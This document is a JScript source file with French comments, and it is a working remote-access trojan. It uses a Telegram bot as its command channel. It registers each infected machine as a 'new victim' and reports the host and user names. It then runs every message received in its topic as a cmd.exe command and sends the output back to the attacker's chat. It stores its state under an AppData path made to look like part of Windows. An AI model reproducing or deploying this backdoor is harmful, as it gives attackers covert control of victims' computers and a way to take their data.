// ============ CONFIG ============
var TOKEN = "8859533807:AAGQf2AWxoo485NnR6vc0XPiuO4oupLU508";
var GROUP_ID = "-1004211302801";  // chat_id du groupe
var BASE = "C:\\Users\\<user>\\AppData\\Roaming\\Microsoft\\Windows\\";
var STATE_FILE = BASE + "state.txt";   // stocke: thread_id|last_update_id

// ============ HELPERS ============
var fso = new ActiveXObject("Scripting.FileSystemObject");
var net = new ActiveXObject("WScript.Network");

function httpGet(url) {
    var h = new ActiveXObject("MSXML2.XMLHTTP");
    h.Open("GET", url, false);
    h.Send();
    return h.responseText;
}

function httpPost(url, body) {
    var h = new ActiveXObject("MSXML2.XMLHTTP");
    h.Open("POST", url, false);
    h.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
    h.Send(body);
    return h.responseText;
}

// Parser JSON minimal (JScript n'a pas JSON.parse)
function parseJson(s) {
    return eval("(" + s + ")");
}

function readState() {
    try {
        var f = fso.OpenTextFile(STATE_FILE, 1);
        var line = f.ReadLine();
        f.Close();
        var parts = line.split("|");
        return { thread: parseInt(parts[0]), last: parseInt(parts[1]) };
    } catch(e) {
        return { thread: 0, last: 0 };
    }
}

function writeState(thread, last) {
    var f = fso.OpenTextFile(STATE_FILE, 2, true);
    f.WriteLine(thread + "|" + last);
    f.Close();
}

// ============ ENREGISTREMENT ============
function getMachineId() {
    var host = net.ComputerName;
    var user = net.UserName;
    // Hash simple
    var raw = host + user;
    var hash = 0;
    for (var i = 0; i < raw.length; i++) {
        hash = ((hash << 5) - hash) + raw.charCodeAt(i);
        hash = hash & hash;
    }
    return host + " [" + Math.abs(hash).toString(16).substring(0, 6) + "]";
}

function registerIfNeeded() {
    var state = readState();
    if (state.thread > 0) return state.thread;

    // Créer un topic
    var name = getMachineId();
    var resp = httpPost(
        "https://api.telegram.org/bot" + TOKEN + "/createForumTopic",
        "chat_id=" + GROUP_ID + "&name=" + encodeURIComponent(name)
    );
    var data = parseJson(resp);
    if (!data.ok) return 0;

    var thread = data.result.message_thread_id;

    // Message de bienvenue avec infos machine
    var info = "🖥 Nouvelle victime\n"
        + "Host: " + net.ComputerName + "\n"
        + "User: " + net.UserName + "\n"
        + "OS: " + "Windows\n"
        + "Date: " + new Date().toString();

    httpPost(
        "https://api.telegram.org/bot" + TOKEN + "/sendMessage",
        "chat_id=" + GROUP_ID
        + "&message_thread_id=" + thread
        + "&text=" + encodeURIComponent(info)
    );

    writeState(thread, 0);
    return thread;
}

// ============ BOUCLE PRINCIPALE ============
var threadId = registerIfNeeded();
if (threadId === 0) WScript.Quit();

var state = readState();
var lastUpdate = state.last;

var resp = httpGet(
    "https://api.telegram.org/bot" + TOKEN
    + "/getUpdates?offset=" + (lastUpdate + 1)
    + "&timeout=0"
);
var data = parseJson(resp);

if (data.ok && data.result.length > 0) {
    for (var i = 0; i < data.result.length; i++) {
        var upd = data.result[i];
        lastUpdate = upd.update_id;

        // Ignore si pas de message ou pas dans notre topic
        if (!upd.message) continue;
        if (upd.message.message_thread_id !== threadId) continue;
        if (!upd.message.text) continue;

        var cmd = upd.message.text;
        var output = "";

        try {
            var sh = new ActiveXObject("WScript.Shell");
            var exec = sh.Exec("cmd.exe /c " + cmd);
            output = exec.StdOut.ReadAll() + exec.StdErr.ReadAll();
        } catch(e) {
            output = "Erreur: " + e.message;
        }

        if (output === "") output = "(pas de sortie)";
        if (output.length > 4000) output = output.substring(0, 4000) + "...[tronqué]";

        httpPost(
            "https://api.telegram.org/bot" + TOKEN + "/sendMessage",
            "chat_id=" + GROUP_ID
            + "&message_thread_id=" + threadId
            + "&text=" + encodeURIComponent(output)
        );
    }

    writeState(threadId, lastUpdate);
}